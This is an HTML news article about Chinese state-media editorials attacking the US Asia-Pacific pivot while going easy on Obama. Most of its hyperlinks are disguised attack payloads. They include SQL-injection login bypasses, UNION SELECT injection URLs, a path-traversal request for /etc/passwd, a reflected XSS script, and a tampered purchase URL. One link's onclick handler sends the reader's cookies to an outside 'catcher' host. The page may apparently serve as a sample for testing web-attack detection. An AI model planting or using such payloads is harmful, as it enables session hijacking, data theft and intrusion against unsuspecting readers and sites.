<h2>Chinese media lash out at US Asia policy, go easy on Barack Obama</h2>

<p class="details">Shyam Balasubramanian | TNN | Sep 9, 2016, 04.01 PM IST<a href="#"></a> </p>

<p>

Chinese state-run <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
271&submit=Login" target="_blank">media outlets </a> on Friday roundly attacked the US for its increasing foreign policy focus on the Asia Pacific. Even as they took a softer tone when referring to US President Barack Obama, they panned the <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">  foreign policy reorientation </a> that he spearheaded.
</p>
<p><img class="alignright" src="/images/obama.png" width="350" height="350" alt="USA" /></p>

 <p>
Editorials in two government-run newspapers -<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> Global Times </a> and <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">  China Daily</a> - focussed on US foreign policy under Obama, a day the completion of the ASEAN Summit in Laos+ . Obama became the first US President to participate in a summit of the grouping of Southeast Asian nations, many of whom are grappling with China's expansive territorial claims in the South China Sea.
</p> <p>
Even as it gave Obama credit for raising the <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank" > Asia Pacific region's </a> place in America's foreign policy priorities, the China Daily editorial said, "With his days in office numbered, Obama cannot do much to press ahead with the pivot he has sought to engineer, which has not progressed as smoothly as he no doubt hoped. Not because the idea is flawed,  <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank"> but because its execution has been." </a>
</p> <p>
"The problem is, rather than wanting to be a member of an <a href="http://www.theplanetreports.com/index.php?name=Visitor%3Cscript%3Ealert(%27You%20are%20being%20attacked.%27)%3C/script%3E" target="_blank"> Asian community of shared destiny</a>, the US has returned to the Asia-Pacific flexing its muscles, and thus expecting to get its own way. The idea of justifying the US' militaristic pivot with the tensions it has created is counterproductive. Unless it comes to help consolidate the region's peaceful environment, the US will only end up hurting its own fundamental interests, as Asian countries are preoccupied with working together for common development," the editorial added, even as it  <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">  skipped mention of the tensions </a> that Beijing faces with nearly every Southeast Asian country.
</p> <p>
The editorial in the Global Times however was <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank"> less charitable towards the US.</a> "The core of the rebalance to the Asia-Pacific includes deployment of 60 percent of US naval assets to Asia, the Trans-Pacific Partnership free trade deal, and smart diplomacy which aims at  alienating China from other countries," it read.
</p> <p>
Even as it characterized Obama as the US President with the <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">"least hard-line" on China, </a> it painted a bleak picture of the future of relations between Washington and Beijing, and said the strains placed on relations by the current dispensation would help China emerge with more maturity. 
</p> <p>

"As long as China's GDP is getting close to that of the US, Washington will put Beijing in check, <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">  with or without the rebalance </a> strategy. China should adopt a calm mind and handle complicated matters with ease," the Global Times editorial said.
</p> <p>

The editorials give an insight into a possible siege mindset that setting in among Beijing's foreign policy mandarins. China has expressed an increasingly displeased line on the rising US presence in the region. Expanding ties and exchanges between the US and other nations in the Asia Pacific, including India's attempt to step up engagement in the region have seen China feel the pressure of encirclement.

</p>


